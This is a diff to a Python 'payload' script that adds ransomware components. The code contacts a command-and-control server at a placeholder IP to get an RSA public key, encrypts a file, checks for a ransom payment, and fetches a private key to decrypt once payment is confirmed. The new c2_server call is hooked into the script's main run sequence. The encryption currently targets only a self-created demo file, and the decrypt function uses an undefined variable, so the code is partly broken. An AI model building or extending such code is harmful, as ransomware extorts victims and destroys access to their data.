@@ -3,6 +3,8 @@ from tkinter import messagebox
 import os
 import sys
 import subprocess
+import requests
+import rsa
 
 print("Start Payload")
 
@@ -81,8 +83,102 @@ def windows_payload():
     os.remove("./admin_script.bat")
     os.remove("./extracted_payload.py")
 
+# connect to C2 server
+def c2_server():
+    try:
+        response = requests.get("http://INSERT IP:3000/gen-key") # send GET request for public key
+        if response.status_code == 200:
+            public_key = response.text.strip() # retrieve public key
+            print("Public key had been received")
+            with open("public_key.pem", "w") as pub_key_file:
+                pub_key_file.write(public_key)
+
+            # encrypt machine with public key
+            enc_machine(public_key) # encryot machine
+        else: 
+            print(f"Failed to get public key: {response.status_code}")
+    except Exception as e:
+        print(f"C2 server error connection: {e}")
+
+# encrypted machine and store file
+def enc_machine(public_key):
+    try: 
+        # create file to be encrpted
+        with open("file_to_encrypt.txt", "w") as ef:
+            ef.write("File that will be encrypted.")
+
+        with open("file_to_encrypt.txt", "rb") as f:
+            data = f.read()
+        
+        # rsa encryption: load the public key and encrypt
+        public_key = rsa.PublicKey.load_pkcs1(public_key) # convert key from pem to rsa
+        encrypted_data = rsa.encrypt(data, public_key) # file data encryption
+
+        # save the data to new file
+        with open("file_encrypted.txt", "wb") as enc_file:
+            enc_file.write(encrypted_data)
+        print("Machine has been encrypted with public key.")
+
+        # state that machine is encyrpted
+        with open("encrypted_status.txt", "w") as status:
+            status.write("Encrypted!")
+
+        # checking for a payment
+        #payment_check()
+    except Exception as e:
+        print(f"Encryption error: {e}")
+
+# POT request to check payemnt
+def payment_check():
+    try:
+        # read saved public key to send to payment check rquest
+        with open("public_key.pem", "r") as pub_key_file:
+            pub_key = pub_key_file.read().strip()
+
+        # send a POST request
+        response = requests.post("http://INSERT IP:3000/check-payment", json={"pub_key": pub_key})
+
+        if response.status_code == 200:
+            # decrypt the machine if payment is confirmed
+            print("Received Payment! will decrypted machine...")
+            dec_machine()
+        else:
+            print("Did not receive payment. your machinie remains encrypted")
+    
+    except Exception as e:
+        print(f"Checking payment error: {e}")
+
+# decrytp machine
+def dec_machine():
+    try:
+        # read the encrypt file
+        with open("file_encrypted.txt", "rb") as enc_file:
+            encrypted_data = enc_file.read()
+        
+        # send POSt to get prvate key
+        response = requests.post("http://INSERT IP:3000/check-payment", json={"pub_key": pub_key})
+
+        if response.status_code == 200:
+            # if private key is received, decrypt file
+            private_key = response.json().get("key") #  get tth private key 
+            private_key = rsa.PrivateKey.load_pkcs1(private_key) # load private key
+
+            # decrypt using private key
+            decrypted_data = rsa.decrypt(encrypted_data, private_key)
+
+            # save to new file
+            with open("decrypted_file.txt", "wb") as dec_file:
+                dec_file.write(decrypted_data)
+
+            print("successfuly decrypted!")
+        else:
+            print("failed to get private key")
+    except Exception as e:
+        print(f"Error decrypting machine: {e}")
+
 windows_payload()
 check_cmd_disabled()
+c2_server()
 
 # #Run the batch file with administrator privileges without prompts
 # try:
